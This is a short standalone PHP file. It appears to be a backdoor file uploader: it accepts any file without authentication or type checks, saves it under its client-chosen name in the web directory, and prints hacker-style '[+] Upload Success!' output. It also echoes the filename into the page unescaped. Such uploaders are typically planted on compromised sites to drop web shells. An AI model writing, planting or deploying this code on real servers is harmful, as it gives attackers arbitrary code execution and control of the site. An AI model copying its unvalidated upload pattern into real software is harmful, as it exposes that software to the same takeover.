<?php
if (isset($_FILES['file'])) {
    // folder name
    $target_file = basename($_FILES['file']['name']);
    
    // path file finish
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        echo "[+] Upload Success! File: <a href='$target_file'>$target_file</a>";
    } else {
        echo "[-] Upload Failed!";
    }
}
?>

<!DOCTYPE html>
<html>
<body>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>
</body>
</html>